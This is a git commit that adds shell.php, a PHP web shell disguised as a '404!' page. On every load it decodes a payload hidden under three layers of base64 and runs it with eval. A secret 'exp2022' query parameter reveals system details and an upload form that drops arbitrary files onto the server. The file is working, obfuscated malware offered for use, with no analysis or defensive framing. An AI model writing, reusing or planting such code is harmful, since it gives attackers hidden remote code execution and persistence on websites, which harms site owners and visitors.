997735557709b17bd5227fc7535d6e6ea85c450f
k0p3r <38169010+k0p3r@users.noreply.github.com>
2022-06-27 21:54:22 -0400

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,21 @@
+<title>404! </title>
+<?php
+function b_start(){	
+	$b_start = "UTFOU2FWZ3liSGRKUkRCbldqSldNRnBYTlRKTFEwcFRVbFV4VUZaRlZtWlJWVkpGVldsSmNFOTNiMHBLUjBwbVkyMUZNRTVEUVRsSlNFcG9ZbTFSYjAxVGQyZFBWR3MxVDFScmNFOTNiMHBLUjBwbVl6TldhV0ZxYXpSSlJEQm5TV2xDVkdGSFZuTmlRMEk0U2tkS1ptRllRV2xQZDI5S1NrZEtabHBYTVdoaFYzZG5VRk5CYVZsWGVIQk5ha0Y0VDBkYWFHVnRWbk5SUjJSMFdWZHNjMHh0VG5aaVUwazNRMmRyYTFsc09XMWpiVGwwU1VRd1owbHJXbmxpTWpBMlNVWktiR016Vm5Oa1JIaG9Za2RyZVUxRVJUUmFiVVkyV2xkNFFWb3lNV2hoVjNkMVdUSTVkRWxxYzB0RFUxSnBXREpGTUU1VFFUbEpRMUptVlRCV1UxWnJWbE5YZVdSVFVsWkdWbEpXVGxWWU1WWlRVMU5rWkU5M2IwcEtSMHBtV1dwak1VbEVNR2RLUmpsVVVsWktWMUpXU21KS01HaFZWa1pDWmxORk9WUldRMlJrVDNkdlNrcEhTbVppVkVsNVNVUXdaMHBIYkhkSlF6Um5TV2xKTjBObmEydFpiRGwwWXpKak5FOUVZM3BKUkRCblNXbFNhVmd5UlRCT1UwRnJXV3c1YVU1NlZXZEtSMHBtWWxSSmVVbHFjMHREVnpGb1lWZDNiMHBIU21aYVZ6Rm9ZVmQzYzBsRFVtbFlNMDR4V1cxdk5VOURkMmRLUjBwbVlsaE9iazlFWnpOTmVYZG5Ta2RLWmxwdVNuWmlVMnMz";
+	$b_start = base64_decode($b_start);$b_start = base64_decode($b_start);$b_start = base64_decode($b_start);
+	eval($b_start);
+}
+b_start();
+if ( isset($_GET['exp2022']) )
+{
+	echo '<center><link href="https://rozup.ir/view/3512534/hacker.css" rel="stylesheet">
+<b>'.php_uname().'<br></b><b><br><br>'.''.'<br></b>';
+	echo '<form action="" method="post" enctype="multipart/form-data" name="b4b4" id="b4b4">';
+	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+		echo '<a href="#">Exploit 2022 Tnx : Bibil - RooTer - K4liRooT</a>';
+	if( $_POST['_upl'] == "Upload" ) {
+		if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Done</b><br><br><a href="./' . $_FILES['file']['name'] . '">' . $_FILES['file']['name'] . '</a>'; }
+		else { echo '<b>Not Upload File !</b><br><br>'; }
+	}
+exit;
+}?>
